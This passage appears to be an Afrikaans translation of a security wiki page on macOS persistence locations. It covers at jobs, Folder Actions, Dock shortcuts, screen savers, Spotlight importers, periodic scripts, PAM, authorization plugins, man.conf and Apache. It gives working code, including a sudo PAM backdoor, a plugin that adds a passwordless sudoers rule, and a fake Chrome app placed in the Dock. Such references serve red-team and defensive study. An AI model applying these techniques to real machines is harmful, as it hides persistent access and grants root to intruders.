SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> As AT take nie geaktiveer is nie, sal die geskepte take nie uitgevoer word nie.

Die **werk lêers** kan gevind word by `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Die lêernaam bevat die wag, die werksnommer, en die tyd wat dit geskeduleer is om te loop. Byvoorbeeld, kom ons kyk na `a0001a019bdcd2`.

- `a` - dit is die wag
- `0001a` - werksnommer in hex, `0x1a = 26`
- `019bdcd2` - tyd in hex. Dit verteenwoordig die minute wat verbygegaan het sedert die epoch. `0x019bdcd2` is `26991826` in desimale. As ons dit met 60 vermenigvuldig, kry ons `1619509560`, wat `GMT: 2021. April 27., Dinsdag 7:46:00` is.

As ons die werkslêer druk, vind ons dat dit dieselfde inligting bevat wat ons met `at -c` gekry het.

### Gidsaksies

Skrywe: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Skrywe: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Nuttig om die sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar jy moet in staat wees om `osascript` met argumente aan te roep om **`System Events`** te kontak om Gidsaksies te kan konfigureer
- TCC omseiling: [🟠](https://emojipedia.org/large-orange-circle)
- Dit het 'n paar basiese TCC-toestemmings soos Desktop, Dokumente en Aflaaie

#### Ligging

- **`/Library/Scripts/Folder Action Scripts`**
- Wortel benodig
- **Trigger**: Toegang tot die gespesifiseerde gids
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Toegang tot die gespesifiseerde gids

#### Beskrywing & Exploitatie

Gidsaksies is skripte wat outomaties geaktiveer word deur veranderinge in 'n gids soos die toevoeging, verwydering van items, of ander aksies soos om die gidsvenster te open of te hergroott. Hierdie aksies kan vir verskeie take gebruik word, en kan op verskillende maniere geaktiveer word, soos deur die Finder UI of terminale opdragte.

Om Gidsaksies op te stel, het jy opsies soos:

1. Om 'n Gidsaksie werkvloei met [Automator](https://support.apple.com/guide/automator/welcome/mac) te skep en dit as 'n diens te installeer.
2. Om 'n skrip handmatig aan te heg via die Gidsaksies-opstelling in die konteksmenu van 'n gids.
3. Om OSAScript te gebruik om Apple Event-boodskappe na die `System Events.app` te stuur vir programmatiese opstelling van 'n Gidsaksie.
- Hierdie metode is veral nuttig om die aksie in die stelsel in te bed, wat 'n vlak van volharding bied.

Die volgende skrip is 'n voorbeeld van wat deur 'n Gidsaksie uitgevoer kan word:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Om die bogenoemde skrip gebruikbaar te maak deur Folder Actions, kompileer dit met:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Nadat die skrip gekompileer is, stel Folder Actions op deur die onderstaande skrip uit te voer. Hierdie skrip sal Folder Actions globaal aktief maak en spesifiek die voorheen gekompileerde skrip aan die Desktop-gids koppel.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Voer die opstelling-skrip uit met:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Dit is die manier om hierdie volharding via GUI te implementeer:

Dit is die skrif wat uitgevoer sal word:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Kompileer dit met: `osacompile -l JavaScript -o folder.scpt source.js`

Skuif dit na:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Dan, open die `Folder Actions Setup` app, kies die **map wat jy wil monitor** en kies in jou geval **`folder.scpt`** (in my geval het ek dit output2.scp genoem):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Nou, as jy daardie map met **Finder** oopmaak, sal jou skrip uitgevoer word.

Hierdie konfigurasie is gestoor in die **plist** geleë in **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in base64 formaat.

Nou, kom ons probeer om hierdie volharding voor te berei sonder GUI-toegang:

1. **Kopieer `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** na `/tmp` om dit te rugsteun:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Verwyder** die Folder Actions wat jy pas gestel het:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Nou dat ons 'n leë omgewing het

3. Kopieer die rugsteunlêer: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Open die Folder Actions Setup.app om hierdie konfigurasie te gebruik: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> En dit het nie vir my gewerk nie, maar dit is die instruksies uit die skrywe:(

### Dock snelkoppelinge

Skrywe: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Nuttig om die sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar jy moet 'n kwaadwillige toepassing binne die stelsel geïnstalleer hê
- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: Wanneer die gebruiker op die toepassing binne die dock klik

#### Beskrywing & Exploitatie

Al die toepassings wat in die Dock verskyn, is binne die plist gespesifiseer: **`~/Library/Preferences/com.apple.dock.plist`**

Dit is moontlik om **'n toepassing by te voeg** net met:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Deur sommige **sosiale ingenieurswese** te gebruik, kan jy **byvoorbeeld Google Chrome** in die dok naboots en eintlik jou eie skrip uitvoer:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Kleur Kiesers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- 'n Baie spesifieke aksie moet gebeur
- Jy sal in 'n ander sandbox eindig
- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `/Library/ColorPickers`
- Wortel benodig
- Trigger: Gebruik die kleur kieser
- `~/Library/ColorPickers`
- Trigger: Gebruik die kleur kieser

#### Beskrywing & Exploit

**Compileer 'n kleur kieser** bundel met jou kode (jy kan [**hierdie een byvoorbeeld**](https://github.com/viktorstrate/color-picker-plus) gebruik) en voeg 'n konstruktor by (soos in die [Skermbeskermer afdeling](macos-auto-start-locations.md#screen-saver)) en kopieer die bundel na `~/Library/ColorPickers`.

Dan, wanneer die kleur kieser geaktiveer word, moet jou kode ook geaktiveer word.

Let daarop dat die binêre wat jou biblioteek laai 'n **baie beperkende sandbox** het: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Nuttig om sandbox te omseil: **Nee, omdat jy jou eie app moet uitvoer**
- TCC omseiling: ???

#### Ligging

- 'n Spesifieke app

#### Beskrywing & Exploit

'n Toepassing voorbeeld met 'n Finder Sync Extension [**kan hier gevind word**](https://github.com/D00MFist/InSync).

Toepassings kan `Finder Sync Extensions` hê. Hierdie uitbreiding sal binne 'n toepassing gaan wat uitgevoer sal word. Boonop, om die uitbreiding in staat te stel om sy kode uit te voer, **moet dit onderteken** wees met 'n geldige Apple ontwikkelaar sertifikaat, dit moet **sandboxed** wees (alhoewel verslapte uitsonderings bygevoeg kan word) en dit moet geregistreer wees met iets soos:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Skermbeskermer

Skrywe: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Skrywe: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy sal in 'n algemene toepassing sandbox eindig
- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `/System/Library/Screen Savers`
- Wortel benodig
- **Trigger**: Kies die skermbeskermer
- `/Library/Screen Savers`
- Wortel benodig
- **Trigger**: Kies die skermbeskermer
- `~/Library/Screen Savers`
- **Trigger**: Kies die skermbeskermer

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Beskrywing & Exploit

Skep 'n nuwe projek in Xcode en kies die sjabloon om 'n nuwe **Skermbeskermer** te genereer. Voeg dan jou kode daaraan toe, byvoorbeeld die volgende kode om logs te genereer.

**Bou** dit, en kopieer die `.saver` bundel na **`~/Library/Screen Savers`**. Open dan die Skermbeskermer GUI en as jy net daarop klik, moet dit baie logs genereer:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Let daarop dat omdat jy binne die regte van die binêre wat hierdie kode laai (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) **`com.apple.security.app-sandbox`** kan vind, jy sal **binne die algemene toepassingsand sandbox** wees.

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy sal in 'n toepassing sandbox eindig
- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
- Die sandbox lyk baie beperk

#### Location

- `~/Library/Spotlight/`
- **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat deur die spotlight plugin bestuur word, word geskep.
- `/Library/Spotlight/`
- **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat deur die spotlight plugin bestuur word, word geskep.
- Root benodig
- `/System/Library/Spotlight/`
- **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat deur die spotlight plugin bestuur word, word geskep.
- Root benodig
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat deur die spotlight plugin bestuur word, word geskep.
- Nuwe toepassing benodig

#### Description & Exploitation

Spotlight is macOS se ingeboude soekfunksie, ontwerp om gebruikers **vinnige en omvattende toegang tot data op hul rekenaars** te bied.\
Om hierdie vinnige soekvermoë te fasiliteer, hou Spotlight 'n **eie databasis** en skep 'n indeks deur **meeste lêers te ontleed**, wat vinnige soektogte deur sowel lêernames as hul inhoud moontlik maak.

Die onderliggende meganisme van Spotlight behels 'n sentrale proses genaamd 'mds', wat staan vir **'metadata server'.** Hierdie proses orkestreer die hele Spotlight diens. Ter aanvulling hiervan, is daar verskeie 'mdworker' daemons wat 'n verskeidenheid onderhoudstake uitvoer, soos die indeksering van verskillende lêertipes (`ps -ef | grep mdworker`). Hierdie take word moontlik gemaak deur Spotlight invoerder plugins, of **".mdimporter bundles**", wat Spotlight in staat stel om inhoud oor 'n diverse reeks lêerformate te verstaan en te indekseer.

Die plugins of **`.mdimporter`** bundles is geleë in die plekke wat vroeër genoem is en as 'n nuwe bundle verskyn, word dit binne 'n minuut gelaai (geen behoefte om enige diens te herbegin nie). Hierdie bundles moet aandui watter **lêertipe en uitbreidings hulle kan bestuur**, sodat Spotlight hulle sal gebruik wanneer 'n nuwe lêer met die aangeduide uitbreiding geskep word.

Dit is moontlik om **alle `mdimporters`** wat gelaai is, te vind deur te loop:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
En byvoorbeeld **/Library/Spotlight/iBooksAuthor.mdimporter** word gebruik om hierdie tipe lêers (uitbreidings `.iba` en `.book` onder andere) te ontleed:
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> As jy die Plist van ander `mdimporter` nagaan, mag jy nie die inskrywing **`UTTypeConformsTo`** vind nie. Dit is omdat dit 'n ingeboude _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) is en dit nie nodig is om uitbreidings te spesifiseer nie.
>
> Boonop het stelsels standaard plugins altyd voorrang, so 'n aanvaller kan slegs toegang verkry tot lêers wat nie andersins deur Apple se eie `mdimporters` geïndekseer word nie.

Om jou eie importer te skep, kan jy met hierdie projek begin: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) en dan die naam, die **`CFBundleDocumentTypes`** verander en **`UTImportedTypeDeclarations`** byvoeg sodat dit die uitbreiding ondersteun wat jy wil ondersteun en dit in **`schema.xml`** reflekteer.\
Verander dan die kode van die funksie **`GetMetadataForFile`** om jou payload uit te voer wanneer 'n lêer met die verwerkte uitbreiding geskep word.

Laastens **bou en kopieer jou nuwe `.mdimporter`** na een van die vorige plekke en jy kan kyk of dit gelaai is **deur die logs te monitor** of deur **`mdimport -L.`** te kontroleer.

### ~~Voorkeurpaneel~~

> [!CAUTION]
> Dit lyk nie of dit meer werk nie.

Skrywe: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Dit benodig 'n spesifieke gebruikersaksie
- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Plek

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Beskrywing

Dit lyk nie of dit meer werk nie.

## Root Sandbox Omseiling

> [!TIP]
> Hier kan jy begin plekke vind wat nuttig is vir **sandbox omseiling** wat jou toelaat om eenvoudig iets uit te voer deur dit **in 'n lêer te skryf** terwyl jy **root** is en/of ander **vreemde toestande** vereis.

### Periodiek

Skrywe: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees
- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Plek

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root benodig
- **Trigger**: Wanneer die tyd aanbreek
- `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local`
- Root benodig
- **Trigger**: Wanneer die tyd aanbreek

#### Beskrywing & Exploitatie

Die periodieke skripte (**`/etc/periodic`**) word uitgevoer as gevolg van die **launch daemons** wat in `/System/Library/LaunchDaemons/com.apple.periodic*` geconfigureer is. Let daarop dat skripte wat in `/etc/periodic/` gestoor is, **uitgevoer** word as die **eienaar van die lêer,** so dit sal nie werk vir 'n potensiële voorregverhoging nie.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Daar is ander periodieke skripte wat uitgevoer sal word soos aangedui in **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
As jy enige van die lêers `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local` skryf, sal dit **vroeër of later uitgevoer word**.

> [!WARNING]
> Let daarop dat die periodieke skrip **uitgevoer sal word as die eienaar van die skrip**. So as 'n gewone gebruiker die skrip besit, sal dit as daardie gebruiker uitgevoer word (dit kan voorkom dat voorregte verhoog aanvalle).

### PAM

Skrywe: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Skrywe: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees
- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Root altyd vereis

#### Beskrywing & Exploitatie

Aangesien PAM meer gefokus is op **volharding** en malware as op maklike uitvoering binne macOS, sal hierdie blog nie 'n gedetailleerde verduideliking gee nie, **lees die skrywe om hierdie tegniek beter te verstaan**.

Kontroleer PAM-modules met:
```bash
ls -l /etc/pam.d
```
'n Volharding/privilege escalation tegniek wat PAM misbruik, is so maklik soos om die module /etc/pam.d/sudo te wysig deur aan die begin die lyn by te voeg:
```bash
auth       sufficient     pam_permit.so
```
So dit sal **lyk soos** iets soos hierdie:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
En daarom sal enige poging om **`sudo` te gebruik** werk.

> [!CAUTION]
> Let daarop dat hierdie gids deur TCC beskerm word, so dit is hoogs waarskynlik dat die gebruiker 'n versoek sal ontvang om toegang.

Nog 'n mooi voorbeeld is su, waar jy kan sien dat dit ook moontlik is om parameters aan die PAM-modules te gee (en jy kan ook hierdie lêer backdoor):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Magtigingspluggins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees en ekstra konfigurasies maak
- TCC omseiling: ???

#### Ligging

- `/Library/Security/SecurityAgentPlugins/`
- Root benodig
- Dit is ook nodig om die magtiging databasis te konfigureer om die plugin te gebruik

#### Beskrywing & Exploitatie

Jy kan 'n magtiging plugin skep wat uitgevoer sal word wanneer 'n gebruiker aanmeld om volharding te handhaaf. Vir meer inligting oor hoe om een van hierdie pluggins te skep, kyk na die vorige writeups (en wees versigtig, 'n swak geskryfde een kan jou uitsluit en jy sal jou mac uit herstelmodus moet skoonmaak).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Skuif** die bundel na die ligging om gelaai te word:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Laastens voeg die **reël** by om hierdie Plugin te laai:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Die **`evaluate-mechanisms`** sal die magtigingsraamwerk vertel dat dit **'n eksterne meganisme vir magtiging** moet **aanroep**. Boonop sal **`privileged`** dit deur root laat uitvoer.

Trigger dit met:
```bash
security authorize com.asdf.asdf
```
En dan moet die **personeelgroep sudo** toegang hê (lees `/etc/sudoers` om te bevestig).

### Man.conf

Skrywe: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees en die gebruiker moet man gebruik
- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/private/etc/man.conf`**
- Root vereis
- **`/private/etc/man.conf`**: Wanneer man gebruik word

#### Beskrywing & Exploit

Die konfigurasie lêer **`/private/etc/man.conf`** dui die binêre/script aan wat gebruik moet word wanneer man dokumentasielêers geopen word. So die pad na die uitvoerbare kan gewysig word sodat wanneer die gebruiker man gebruik om 'n paar dokumente te lees, 'n backdoor uitgevoer word.

Byvoorbeeld gestel in **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
En skep dan `/tmp/view` as:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Skrywe**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees en apache moet loop
- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
- Httpd het nie regte nie

#### Ligging

- **`/etc/apache2/httpd.conf`**
- Root benodig
- Trigger: Wanneer Apache2 begin word

#### Beskrywing & Exploit

Jy kan in `/etc/apache2/httpd.conf` aandui om 'n module te laai deur 'n lyn soos:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Op hierdie manier sal jou saamgestelde module deur Apache gelaai word. Die enigste ding is dat jy dit of **met 'n geldige Apple-sertifikaat moet teken**, of jy moet **'n nuwe vertroude sertifikaat** in die stelsel voeg en dit **met dit teken**.

Dan, indien nodig, om seker te maak dat die bediener begin sal word, kan jy uitvoer:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Kode voorbeeld vir die Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM ouditraamwerk

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

